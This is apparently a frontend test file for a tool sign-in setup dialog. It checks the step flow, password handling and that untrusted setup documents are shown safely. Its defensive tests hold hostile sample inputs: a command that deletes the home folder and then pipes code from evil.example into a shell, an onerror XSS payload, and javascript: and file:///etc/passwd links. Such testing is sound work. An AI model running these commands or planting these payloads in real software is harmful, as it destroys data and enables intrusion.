import userEvent from "@testing-library/user-event"
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest"
import { findTool } from "@/domain/catalog"
import { BLOCK_TYPES, INPUT_KINDS, knownOf, parseSetup, type SetupDocument, textsOf } from "@/domain/setup-flow"
import oauth from "@/domain/setup-v1/oauth-or-token.json"
import pbx from "@/domain/setup-v1/pbx.json"
import tg from "@/domain/setup-v1/tg.json"
import { useLanguage } from "@/i18n"
import { platform } from "@/platform/bridge"
import { CommandError, TOO_OLD } from "@/platform/command-error"
import type { SignInEvent } from "@/platform/signin-schemas"
import { useOnboarding } from "@/shared/onboarding-store"
import { useSandbox } from "@/shared/sandbox-store"
import { useSignIn } from "@/shared/signin-store"
import { reduceMotion } from "@/testing/motion"
import { act, render, screen, within } from "@/testing/render"
import { openSignIn } from "@/testing/signin"
import { Blocks, type FlowView } from "./SetupBlocks"
import { SignInDialog } from "./SignInDialog"
import { useSetupFlow } from "./setup-flow-store"

const PNG = "data:image/png;base64,iVBORw0KGgo="
const copy = <T,>(value: T): T => structuredClone(value)

let send: (e: SignInEvent) => void = () => undefined
let finish: () => void = () => undefined

const pbxTool = findTool("pbx")
const pbxSignIn = pbxTool?.signIn

beforeEach(() => {
  // "0.0.0" so any installed pbx counts as new enough for the flow.
  if (pbxTool && pbxSignIn) pbxTool.signIn = { ...pbxSignIn, setupFrom: "0.0.0" }
  reduceMotion()
  useOnboarding.setState({ open: false })
  vi.spyOn(platform, "setupApply").mockImplementation((_id, _profile, _answers, onEvent) => {
    send = (e) => act(() => onEvent(e))
    return new Promise((resolve) => {
      finish = resolve
    })
  })
  vi.spyOn(platform, "signInStop").mockResolvedValue()
})

afterEach(async () => {
  if (pbxTool) {
    pbxTool.signIn = pbxSignIn ?? null
    delete pbxTool.source
  }
  finish()
  act(() => useSignIn.getState().close())
  await act(() => new Promise((done) => setTimeout(done, 0)))
  vi.restoreAllMocks()
})

const describes = (document: unknown, images: Record<string, string> = { "freepbx-cdr": PNG }) =>
  vi.spyOn(platform, "setupShow").mockResolvedValue({ document, images })

const open = async (tool = "pbx") => {
  render(<SignInDialog />)
  await openSignIn(tool, "office")
  return screen.getByRole("dialog")
}

const next = async (dialog: HTMLElement) => {
  await userEvent.click(within(dialog).getByRole("button", { name: "Continue" }))
  await act(() => new Promise((done) => setTimeout(done, 0)))
}

const heading = (dialog: HTMLElement) => within(dialog).getByRole("heading", { level: 3 }).textContent

describe("a tool older than the setup format", () => {
  it("keeps the hand-made form when the tool has no setup show", async () => {
    const show = vi.spyOn(platform, "setupShow").mockRejectedValue(new CommandError(TOO_OLD, "unknown command 'setup'"))
    const dialog = await open()
    expect(show).toHaveBeenCalledWith("pbx", "office")
    expect(within(dialog).getByRole("button", { name: "Start sign-in" })).toBeVisible()
    expect(within(dialog).queryByRole("button", { name: "Continue" })).not.toBeInTheDocument()
  })

  it("asks no tool whose catalog entry declares no setup flow, so no process runs", async () => {
    if (pbxTool && pbxSignIn) pbxTool.signIn = { ...pbxSignIn, setupFrom: undefined }
    const show = describes(pbx)
    const dialog = await open()
    expect(show).not.toHaveBeenCalled()
    expect(within(dialog).getByRole("button", { name: "Start sign-in" })).toBeVisible()
  })

  it("keeps the hand-made form for a flow that runs an action of the tool's own", async () => {
    describes(oauth)
    const dialog = await open()
    expect(within(dialog).getByRole("button", { name: "Start sign-in" })).toBeVisible()
  })

  it("keeps the hand-made form for a document that breaks the format", async () => {
    describes({ ...copy(pbx), steps: { source: { title: "source.title", next: "nowhere" } } })
    const dialog = await open()
    expect(within(dialog).getByRole("button", { name: "Start sign-in" })).toBeVisible()
  })
})

describe("pbx's own flow", () => {
  it("walks the database path, checks each step with the tool, and runs apply with only that path's answers", async () => {
    describes(pbx)
    const check = vi.spyOn(platform, "setupCheck")
    const dialog = await open()
    expect(heading(dialog)).toBe("Where are the call records?")

    await next(dialog)
    expect(heading(dialog)).toBe("Where are the call records?")
    const choices = within(dialog).getAllByRole("group")
    expect(within(choices[0] as HTMLElement).getByText("Choose one.")).toBeVisible()

    await userEvent.click(within(dialog).getByRole("radio", { name: /MySQL or MariaDB/ }))
    await userEvent.click(within(dialog).getByRole("radio", { name: /On this computer/ }))
    await next(dialog)
    expect(heading(dialog)).toBe("Connect to the CDR database")
    expect(JSON.parse(check.mock.calls.at(-1)?.[2] ?? "")).toEqual({ cdr_source: "mysql", files_from: "local" })
    expect(
      within(dialog).getByRole("img", { name: "The FreePBX screen with the CDR database settings" }),
    ).toHaveAttribute("src", PNG)
    expect(within(dialog).getByLabelText("Database")).toHaveValue("asteriskcdrdb")

    await next(dialog)
    const host = within(dialog).getByLabelText("Database server")
    expect(host).toHaveAttribute("aria-invalid", "true")
    expect(host).toHaveFocus()
    expect(within(dialog).getAllByText("Fill this in.").length).toBeGreaterThan(0)

    await userEvent.type(host, "pbx.local")
    await userEvent.type(within(dialog).getByLabelText("Port (optional)"), "3306")
    await userEvent.type(within(dialog).getByLabelText("User"), "asterisk")
    await userEvent.type(within(dialog).getByLabelText("Password", { selector: "input" }), "s3cret")
    await next(dialog)
    expect(heading(dialog)).toBe("Recordings and numbers")

    await userEvent.click(within(dialog).getByRole("button", { name: /Countries/ }))
    await userEvent.click(screen.getByRole("option", { name: /Spain/ }))
    await userEvent.keyboard("{Escape}")
    await next(dialog)
    expect(heading(dialog)).toBe("Checking the connection")
    const sent = JSON.parse(vi.mocked(platform.setupApply).mock.calls[0]?.[2] ?? "")
    expect(sent).toEqual({
      cdr_source: "mysql",
      files_from: "local",
      db_host: "pbx.local",
      db_port: 3306,
      db_name: "asteriskcdrdb",
      db_user: "asterisk",
      db: "s3cret",
      phone_region: ["ES"],
    })
    expect(JSON.stringify(useSetupFlow.getState())).not.toContain("s3cret")
    expect(JSON.stringify(useSignIn.getState())).not.toContain("s3cret")

    send({ event: "progress", step: "check", message: "checking office's settings" })
    expect(within(dialog).getByRole("button", { name: "Cancel" })).toBeVisible()
    send({ event: "done", alreadyLinked: false, received: null })
    await act(() => new Promise((done) => setTimeout(done, 0)))
    expect(heading(dialog)).toBe("Connected")
    expect(within(dialog).getByText("pbx models download gigaam-v3")).toBeVisible()
    expect(within(dialog).getByRole("button", { name: "Done" })).toBeVisible()
  })

  it("goes back to the database step when the tool refuses the password, and says why", async () => {
    describes(pbx)
    const dialog = await open()
    act(() =>
      useSetupFlow.getState().walkTo("recordings", {
        cdr_source: "mysql",
        files_from: "local",
        db_host: "pbx.local",
        db_user: "asterisk",
        phone_region: ["ES"],
      }),
    )
    act(() => useSetupFlow.getState().secret("db", "wrong"))
    await next(dialog)
    send({ event: "failed", message: "the database refused user asterisk", code: "authentication_error" })
    await act(() => new Promise((done) => setTimeout(done, 0)))
    expect(heading(dialog)).toBe("Connect to the CDR database")
    expect(within(dialog).getByRole("alert")).toHaveTextContent("The check failed")
    expect(within(dialog).getByLabelText("Password", { selector: "input" })).toHaveValue("")
    await userEvent.click(within(dialog).getByRole("button", { name: "Back" }))
    expect(heading(dialog)).toBe("Where are the call records?")
  })

  it("ends on the failure step with a help link for any other refusal, and goes back from there", async () => {
    describes(pbx)
    const dialog = await open()
    act(() =>
      useSetupFlow.getState().walkTo("recordings", {
        cdr_source: "csv",
        files_from: "local",
        cdr_csv_path: "/tmp/Master.csv",
        phone_region: ["ES"],
      }),
    )
    await next(dialog)
    send({ event: "failed", message: "cannot read /tmp/Master.csv", code: "not_found" })
    await act(() => new Promise((done) => setTimeout(done, 0)))
    expect(heading(dialog)).toBe("The check failed")
    expect(within(dialog).getByRole("button", { name: /What to check/ })).toBeVisible()
    await userEvent.click(within(dialog).getByRole("button", { name: "Back" }))
    expect(heading(dialog)).toBe("Recordings and numbers")
  })

  it("stays on a step the tool stopped at, with a refusal it names on no field shown here", async () => {
    describes(pbx)
    vi.spyOn(platform, "setupCheck").mockResolvedValue({
      valid: false,
      at: "source",
      errors: [{ input: "cdr_table", setting: "cdr_table", message: "is not a table pbx can read" }],
    })
    const dialog = await open()
    await userEvent.click(within(dialog).getByRole("radio", { name: /MySQL or MariaDB/ }))
    await userEvent.click(within(dialog).getByRole("radio", { name: /On this computer/ }))
    await next(dialog)
    expect(heading(dialog)).toBe("Where are the call records?")
    expect(within(dialog).getByRole("alert")).toHaveTextContent("cdr_table is not a table pbx can read")
  })

  it("takes the owner to a refused choice or country list, not only to a text box", async () => {
    describes(pbx)
    const check = vi.spyOn(platform, "setupCheck").mockResolvedValue({
      valid: false,
      at: "source",
      errors: [{ input: "cdr_source", setting: "cdr_source", message: "is needed" }],
    })
    const dialog = await open()
    await next(dialog)
    expect(within(dialog).getAllByRole("radio")[0]).toHaveFocus()

    act(() => useSetupFlow.getState().walkTo("recordings", { cdr_source: "csv", files_from: "local" }))
    check.mockResolvedValue({
      valid: false,
      at: "recordings",
      errors: [{ input: "phone_region", setting: "phone_region", message: "is needed" }],
    })
    await next(dialog)
    expect(within(dialog).getByRole("button", { name: /Countries/ })).toHaveFocus()
  })

  it("asks in a test copy before the run signs a real account in, and runs nothing on No", async () => {
    describes(pbx)
    const ask = vi.spyOn(useSandbox.getState(), "confirmSignIn").mockResolvedValue(false)
    useSandbox.setState({ name: "demo", confirmSignIn: ask })
    const dialog = await open()
    act(() =>
      useSetupFlow.getState().walkTo("recordings", {
        cdr_source: "csv",
        files_from: "local",
        cdr_csv_path: "/tmp/Master.csv",
        phone_region: ["ES"],
      }),
    )
    await next(dialog)
    expect(ask).toHaveBeenCalled()
    expect(platform.setupApply).not.toHaveBeenCalled()
    expect(heading(dialog)).toBe("Recordings and numbers")
    useSandbox.setState({ name: null })
  })

  it("edits a profile: its settings filled in, a kept password left empty and not sent", async () => {
    describes({
      ...copy(pbx),
      values: { cdr_source: "mysql", files_from: "local", db_host: "old.host", db: { set: true } },
    })
    const check = vi.spyOn(platform, "setupCheck").mockResolvedValue({ valid: true, at: "check", errors: [] })
    const dialog = await open()
    expect(within(dialog).getByRole("radio", { name: /MySQL or MariaDB/ })).toBeChecked()
    await next(dialog)
    expect(within(dialog).getByLabelText("Database server")).toHaveValue("old.host")
    expect(within(dialog).getByLabelText("Password", { selector: "input" })).toHaveValue("")
    expect(within(dialog).getByText(/Saved already/)).toBeVisible()
    await next(dialog)
    expect(JSON.parse(check.mock.calls.at(-1)?.[2] ?? "")).not.toHaveProperty("db")
  })

  it("speaks the app's language, and English where the tool has no translation", async () => {
    act(() => useLanguage.setState({ choice: "ru" }))
    describes(pbx)
    const dialog = await open()
    expect(heading(dialog)).toBe("Где записи о звонках?")
    expect(within(dialog).getByText(/pbx reads the call records/)).toBeVisible()
    expect(within(dialog).getByRole("button", { name: "Продолжить" })).toBeVisible()
  })
})

/** Every step of a document drawn alone, with the answers given, as the dialog draws it. */
function drawAll(document: unknown, answers: Record<string, unknown> = {}) {
  const parsed = parseSetup(document)
  if (parsed.kind !== "flow") throw new Error(parsed.why)
  const doc: SetupDocument = parsed.document
  const t = textsOf(doc, "en")
  const view: FlowView = {
    doc,
    images: { "freepbx-cdr": PNG, "token-page": PNG },
    t,
    known: knownOf(doc, Object.keys(doc.steps), answers),
    answers,
    problems: {},
    domains: [],
    answer: () => undefined,
    secret: () => undefined,
  }
  return Object.entries(doc.steps).map(([id, step]) => {
    const { container, unmount } = render(<Blocks blocks={step.blocks ?? []} view={view} />)
    const alts = [...container.querySelectorAll("img")].map((img) => img.alt)
    const text = [container.textContent ?? "", ...alts].join(" ")
    unmount()
    return { id, text, t }
  })
}

describe("cli-core's examples", () => {
  const runsApply = (doc: unknown) => {
    const out = copy(doc) as { steps: Record<string, { kind?: string; action?: string }> }
    for (const step of Object.values(out.steps)) if (step.kind === "run") step.action = "apply"
    return out
  }

  /** What a block shows when it is drawn: its words, or for a divider nothing to read. */
  const wordsOf = (block: Record<string, unknown>, t: (id?: string) => string): string[] => {
    const own = (key: string) => (typeof block[key] === "string" ? [t(block[key] as string)] : [])
    switch (block.type) {
      case "text":
      case "note":
      case "heading":
      case "link":
      case "requirement":
        return [...own("text"), ...own("fix")]
      case "image":
        return own("alt")
      case "code":
        return [block.code as string]
      case "input":
      case "choice": {
        const options = (block.options as { label: string }[] | undefined) ?? []
        return [...own("label"), ...options.map((o) => t(o.label))]
      }
      case "group":
        return own("title")
      case "divider":
        return []
      default:
        throw new Error(`no check for a ${String(block.type)} block`)
    }
  }
  const unconditional = (blocks: Record<string, unknown>[]): Record<string, unknown>[] =>
    blocks.flatMap((b) =>
      b.when
        ? []
        : // A details group starts closed: its title shows, its blocks once opened.
          [
            b,
            ...(b.type === "group" && b.role !== "details" ? unconditional(b.blocks as Record<string, unknown>[]) : []),
          ],
    )

  it.each([
    ["pbx", pbx, { cdr_source: "mysql", files_from: "local" }],
    ["oauth-or-token", runsApply(oauth), {}],
    ["tg", runsApply(tg), {}],
  ])("draws every block of every step of %s", (_, doc, answers) => {
    const steps = (doc as { steps: Record<string, { blocks?: Record<string, unknown>[] }> }).steps
    for (const { id, text, t } of drawAll(doc, answers))
      for (const block of unconditional(steps[id]?.blocks ?? []))
        for (const words of wordsOf(block, t))
          expect(text, `${id}: a ${String(block.type)} block`).toContain(words.replace(/[`*]/g, ""))
  })

  it("draws a block of every type and an input of every kind", async () => {
    const blocks: Record<string, unknown>[] = [
      { type: "heading", text: "k.heading" },
      { type: "text", text: "k.text" },
      { type: "note", text: "k.note", role: "warning" },
      { type: "image", asset: "freepbx-cdr", alt: "k.image" },
      { type: "code", code: "pbx doctor", copy: true },
      { type: "choice", id: "pick", options: [{ value: "a", label: "k.option" }] },
      { type: "group", role: "details", title: "k.group", blocks: [{ type: "text", text: "k.inside" }] },
      { type: "link", href: "https://wirecat.dev/en/docs/pbx", text: "k.link" },
      { type: "requirement", check: "ffmpeg", text: "k.requirement" },
      { type: "divider" },
      ...INPUT_KINDS.map((kind) => ({
        type: "input",
        id: `in_${kind}`,
        input: kind,
        label: `k.${kind}`,
        ...(kind === "select" || kind === "multiselect" ? { options: [{ value: "x", label: "k.option" }] } : {}),
      })),
    ]
    const texts = Object.fromEntries(
      [...["heading", "text", "note", "image", "option", "group", "inside", "link", "requirement"], ...INPUT_KINDS].map(
        (name) => [`k.${name}`, `Shown ${name}`],
      ),
    )
    const doc = copy(pbx) as unknown as { steps: { source: { blocks: unknown[] } }; texts: { en: object } }
    doc.steps.source.blocks = blocks
    Object.assign(doc.texts.en, texts)
    expect(new Set(blocks.map((b) => b.type))).toEqual(new Set(BLOCK_TYPES))
    const parsed = parseSetup(doc)
    expect(parsed.kind).toBe("flow")
    const { container } = render(
      <Blocks
        blocks={(parsed.kind === "flow" && parsed.document.steps.source?.blocks) || []}
        view={{
          doc: (parsed as { document: SetupDocument }).document,
          images: { "freepbx-cdr": PNG },
          t: textsOf((parsed as { document: SetupDocument }).document, "en"),
          known: knownOf((parsed as { document: SetupDocument }).document, ["source"], {}),
          answers: {},
          problems: {},
          domains: [],
          answer: () => undefined,
          secret: () => undefined,
        }}
      />,
    )
    for (const name of Object.values(texts).filter((text) => text !== "Shown inside" && text !== "Shown image"))
      expect(container.textContent, name).toContain(name)
    expect(screen.getByRole("img", { name: "Shown image" })).toBeVisible()
    expect(screen.getByText("pbx doctor")).toBeVisible()
    expect(container.querySelector("hr")).not.toBeNull()
  })
})

describe("what the document cannot do", () => {
  const withBlocks = (blocks: unknown[], texts: Record<string, string> = {}) => {
    const doc = copy(pbx) as unknown as { steps: { source: { blocks: unknown[] } }; texts: { en: object } }
    doc.steps.source.blocks = blocks
    Object.assign(doc.texts.en, texts)
    return doc
  }

  it("ignores a class outside the reserved names", async () => {
    describes(
      withBlocks([{ type: "text", text: "x.body", class: ["fixed", "inset-0", "z-50", "bg-red-500", "w-narrow"] }], {
        "x.body": "Plain words.",
      }),
    )
    const dialog = await open()
    const box = within(dialog).getByText("Plain words.").closest("div.min-w-0")
    expect(box?.className).toContain("max-w-[34rem]")
    for (const name of ["fixed", "inset-0", "z-50", "bg-red-500"])
      expect(box?.className).not.toMatch(new RegExp(`\\b${name}\\b`))
  })

  it("shows an http link and a link to another site as text, never as a link", async () => {
    describes(
      withBlocks(
        [
          { type: "link", href: "http://wirecat.dev/docs", text: "x.http" },
          { type: "link", href: "https://evil.example/", text: "x.other" },
          { type: "text", text: "x.md" },
          { type: "link", href: "https://wirecat.dev/en/docs/pbx", text: "x.good" },
        ],
        {
          "x.http": "Plain http",
          "x.other": "Another site",
          "x.md": "[javascript](javascript:alert(1)) and [file](file:///etc/passwd)",
          "x.good": "Our docs",
        },
      ),
    )
    const dialog = await open()
    for (const name of ["Plain http", "Another site", "javascript", "file"])
      expect(within(dialog).queryByRole("link", { name: new RegExp(name) })).not.toBeInTheDocument()
    expect(within(dialog).getByText("Plain http")).toBeVisible()
    expect(within(dialog).getByRole("link", { name: /Our docs/ })).toHaveAttribute(
      "href",
      "https://wirecat.dev/en/docs/pbx",
    )
  })

  it("lets only a built-in tool's catalog entry add a site its links may go to", async () => {
    const doc = withBlocks([{ type: "link", href: "https://pbx.example/help", text: "x.help" }], { "x.help": "Help" })
    if (pbxTool?.signIn) pbxTool.signIn = { ...pbxTool.signIn, links: ["pbx.example"] }
    describes(doc)
    let dialog = await open()
    expect(within(dialog).getByRole("link", { name: /Help/ })).toHaveAttribute("href", "https://pbx.example/help")
    act(() => useSignIn.getState().close())

    for (const source of ["community", "own"] as const) {
      if (pbxTool) pbxTool.source = source
      await openSignIn("pbx", "office")
      dialog = screen.getByRole("dialog")
      expect(within(dialog).queryByRole("link", { name: /Help/ }), source).not.toBeInTheDocument()
      act(() => useSignIn.getState().close())
    }
  })

  it("shows a document that names what every object has as plain names, and never breaks the window", async () => {
    const doc = withBlocks(
      [
        { type: "text", text: "constructor" },
        { type: "text", text: "x.hi", params: { name: "toString" } },
        {
          type: "choice",
          id: "constructor",
          options: [{ value: "a", label: "x.a", icon: "constructor" }],
        },
        { type: "image", asset: "constructor", alt: "x.a" },
      ],
      { "x.hi": "Hi {name} {constructor}", "x.a": "Option A" },
    )
    describes(doc)
    const dialog = await open()
    expect(within(dialog).getByText("constructor")).toBeVisible()
    expect(within(dialog).getByText("Hi toString {constructor}")).toBeVisible()
    expect(within(dialog).getByRole("radio", { name: /Option A/ })).toBeVisible()
  })

  it("draws no image that did not come from the package, only its alt text", async () => {
    describes(
      withBlocks([
        { type: "image", asset: "freepbx-cdr", alt: "db.image.alt" },
        { type: "image", asset: "freepbx-cdr", alt: "db.image.caption", class: ["w-full"] },
      ]),
      { "freepbx-cdr": "https://evil.example/track.png" },
    )
    const dialog = await open()
    expect(within(dialog).queryByRole("img")).not.toBeInTheDocument()
    expect(within(dialog).getByText("The FreePBX screen with the CDR database settings")).toBeVisible()
  })

  it("draws no SVG or file image even when Rust handed one over", async () => {
    describes(withBlocks([{ type: "image", asset: "freepbx-cdr", alt: "db.image.alt" }]), {
      "freepbx-cdr": "data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=",
    })
    const dialog = await open()
    expect(within(dialog).queryByRole("img")).not.toBeInTheDocument()
  })

  it("shows raw HTML in a text as text", async () => {
    describes(
      withBlocks([{ type: "text", text: "x.html" }], { "x.html": "<img src=x onerror=alert(1)> **bold** <b>tag</b>" }),
    )
    const dialog = await open()
    expect(within(dialog).queryByRole("img")).not.toBeInTheDocument()
    expect(dialog.querySelector("b")).toBeNull()
    expect(within(dialog).getByText(/<img src=x onerror=alert\(1\)>/)).toBeVisible()
    expect(within(dialog).getByText("bold").tagName).toBe("STRONG")
  })

  it("only shows a command to copy, and runs nothing", async () => {
    describes(withBlocks([{ type: "code", code: "rm -rf ~ && curl https://evil.example | sh", copy: true }]))
    const writeText = vi.fn().mockResolvedValue(undefined)
    Object.assign(navigator, { clipboard: { writeText } })
    const signIn = vi.spyOn(platform, "signIn")
    const dialog = await open()
    await userEvent.click(within(dialog).getByRole("button", { name: "Copy" }))
    expect(writeText).toHaveBeenCalledWith("rm -rf ~ && curl https://evil.example | sh")
    expect(platform.setupApply).not.toHaveBeenCalled()
    expect(signIn).not.toHaveBeenCalled()
  })
})

describe("a flow that breaks while drawn", () => {
  it("keeps the break inside the sign-in: the hand-made form opens, the window stays", async () => {
    describes(pbx)
    vi.spyOn(console, "error").mockImplementation(() => undefined)
    const broken = { ...useSetupFlow.getState() }
    vi.spyOn(useSetupFlow.getState(), "open").mockImplementation(() => {
      throw new Error("a flow this window cannot draw")
    })
    const dialog = await open()
    expect(within(dialog).getByRole("button", { name: "Start sign-in" })).toBeVisible()
    useSetupFlow.setState(broken)
  })
})
